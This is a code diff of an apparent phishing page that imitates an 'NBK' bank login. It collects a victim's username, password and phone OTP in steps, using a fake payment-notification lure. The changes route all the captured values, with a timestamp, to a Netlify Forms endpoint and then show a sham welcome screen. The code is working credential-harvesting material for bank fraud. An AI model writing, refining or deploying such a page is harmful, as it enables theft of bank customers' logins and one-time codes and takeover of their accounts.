@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NBK Login</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.tailwindcss.com/"></script>
     <style>
         /* Custom font for a magazine-like feel (Inter is default, but adding a serif fallback) */
         body {
@@ -62,9 +62,8 @@
     </div>
 
     <script>
-        // Get references to the form wrapper and the dynamic heading
         const loginForm = document.getElementById('loginForm');
-        const dynamicFormContent = document.getElementById('dynamicFormContent'); // New div inside the form
+        const dynamicFormContent = document.getElementById('dynamicFormContent');
         const dynamicHeading = document.getElementById('dynamicHeading');
         const dynamicSubheading = document.getElementById('dynamicSubheading');
 
@@ -72,19 +71,6 @@
         let storedUsername = '';
         let storedPassword = '';
         let storedOtp = '';
-
-        // *** CRITICAL CHANGE: If you want Netlify Forms to capture data,
-        // you MUST NOT use your custom fetch to 127.0.0.1:5000.
-        // Netlify Forms collects submissions directly.
-        // If you intend to use your Flask server, then the `data-netlify="true"`
-        // attribute is not necessary for data collection by Netlify Forms.
-
-        // If you want to send data to your Flask server AND also collect with Netlify Forms,
-        // you'd need a Netlify Function that acts as a proxy, or send data twice.
-        // For the purpose of adding Netlify attribute and getting submissions in Netlify Forms UI,
-        // we'll assume you're replacing the Flask server for this data.
-        // If you NEED the Flask server, then this Netlify Forms setup isn't directly compatible
-        // for data *capture* in Netlify's UI without further changes (e.g., a Netlify Function).
 
         // Function to render the current content based on the login phase
         function renderForm() {
@@ -94,7 +80,7 @@
                 let labelText = '';
                 let inputType = '';
                 let inputId = '';
-                let inputName = ''; // IMPORTANT: Add name attribute for Netlify Forms
+                let inputName = ''; // CRITICAL: This will be the 'name' attribute for Netlify Forms
                 let placeholder = '';
                 let buttonText = '';
                 let inputValue = '';
@@ -103,7 +89,7 @@
                     labelText = 'Enter your username';
                     inputType = 'text';
                     inputId = 'username';
-                    inputName = 'username'; // Netlify Forms needs this
+                    inputName = 'username'; // Netlify Forms needs this name
                     placeholder = 'Your username';
                     buttonText = 'Next';
                     inputValue = storedUsername;
@@ -111,15 +97,15 @@
                     labelText = 'Enter your password';
                     inputType = 'password';
                     inputId = 'password';
-                    inputName = 'password'; // Netlify Forms needs this
+                    inputName = 'password'; // Netlify Forms needs this name
                     placeholder = 'Your password';
                     buttonText = 'Login';
                     inputValue = storedPassword;
                 } else if (loginPhase === 'otp') {
                     labelText = 'Enter OTP sent to your phone number';
-                    inputType = 'text'; // OTP is often text, could be 'number' too
+                    inputType = 'text';
                     inputId = 'otp';
-                    inputName = 'otp'; // Netlify Forms needs this
+                    inputName = 'otp'; // Netlify Forms needs this name
                     placeholder = 'Your OTP';
                     buttonText = 'Verify OTP';
                     inputValue = storedOtp;
@@ -165,13 +151,15 @@
                 dynamicSubheading.textContent = 'Ahmed kumar iniated payment to your NBK Account'; // Set subheading for other phases
             }
 
-            // Attach event listener to the form itself for submission, NOT the button click
-            // This allows Netlify Forms to intercept the submission
+            // Attach the submit event listener to the *form* element itself
+            // This is crucial for Netlify Forms to intercept.
             if (loginPhase === 'username' || loginPhase === 'password' || loginPhase === 'otp') {
-                loginForm.onsubmit = handleFormSubmission; // Use onsubmit on the form element
+                loginForm.onsubmit = handleFormSubmission;
             } else if (loginPhase === 'welcome') {
+                // For the 'welcome' phase, the "Finish" button is just a UI element, not a form submission trigger
                 document.getElementById('proceedButton').addEventListener('click', () => {
                     alert("Welcome to the bank!"); // Simulate proceeding
+                    // In a real app, you would redirect the user here:
                     // window.location.href = '/dashboard.html';
                 });
             }
@@ -214,47 +202,54 @@
             }
 
             // --- IMPORTANT FOR NETLIFY FORMS ---
-            // Instead of sending data to Flask, we'll let Netlify collect it.
-            // When `loginPhase` is 'welcome', we've collected all data and can trigger the actual Netlify submission.
+            // Only when we reach the 'welcome' phase do we perform the actual Netlify form submission.
+            // For intermediate steps, we just manage the UI state.
             if (nextPhase === 'welcome') {
                 // Prepare form data for Netlify submission
-                const formData = new FormData(loginForm); // Use FormData to capture all named inputs
-                // Add the specific 'phase' data you were sending to Flask
-                formData.append('phase', loginPhase);
-                formData.append('username_final', storedUsername); // Send final collected values
-                formData.append('password_final', storedPassword);
-                formData.append('otp_final', storedOtp);
+                const formData = new FormData(); // Create an empty FormData object
+
+                // Append ALL the collected data, including the hidden form-name
+                formData.append('form-name', 'nbk-login'); // Must match the form's name attribute
+                formData.append('username', storedUsername); // Use the name attributes you defined
+                formData.append('password', storedPassword);
+                formData.append('otp', storedOtp);
+                formData.append('phase_submitted', loginPhase); // Optional: useful for tracking
+                formData.append('timestamp', new Date().toISOString()); // Add a timestamp for server-side logging
+
+                // You can also add other static data if needed
+                // formData.append('form_type', 'multi-step-login');
 
 
-                // Option 1: Submit the form using Fetch API to Netlify's forms endpoint
-                // This gives you control to show loading states etc.
-                const netlifyFormUrl = loginForm.action || window.location.pathname; // Submit to current path or defined action
+                // Show loading spinner
+                loginPhase = 'loading';
+                renderForm();
+
+                // Submit the form using Fetch API to Netlify's forms endpoint
+                // The action attribute of your form (if set) or the current page path is the target.
+                const netlifyFormUrl = loginForm.action || window.location.pathname;
+
                 try {
-                    // Show loading spinner
-                    loginPhase = 'loading';
-                    renderForm();
-
                     const response = await fetch(netlifyFormUrl, {
                         method: 'POST',
-                        body: formData, // FormData directly
+                        body: formData, // FormData correctly sets Content-Type
                     });
 
                     if (response.ok) {
                         console.log("Data successfully sent to Netlify Forms!");
-                        // Simulate delay and then proceed to welcome
+                        // Simulate delay and then proceed to welcome UI
                         setTimeout(() => {
                             loginPhase = 'welcome';
                             renderForm();
                             console.log("OTP Verified! Login successful!");
-                            console.log("Username:", storedUsername);
-                            console.log("Password:", storedPassword);
-                            console.log("OTP:", storedOtp);
+                            // For security, avoid logging sensitive data to console in production
+                            console.log("Username (captured):", storedUsername);
+                            console.log("Password (captured):", storedPassword);
+                            console.log("OTP (captured):", storedOtp);
                         }, 3000); // 3 seconds delay
                     } else {
                         console.error("Failed to send data to Netlify Forms. Status:", response.status);
-                        // Handle error, maybe revert to previous phase or show error message
                         alert("An error occurred during submission. Please try again.");
-                        loginPhase = 'otp'; // Go back to OTP if submission failed
+                        loginPhase = 'otp'; // Revert to OTP if submission fails
                         renderForm();
                     }
                 } catch (error) {
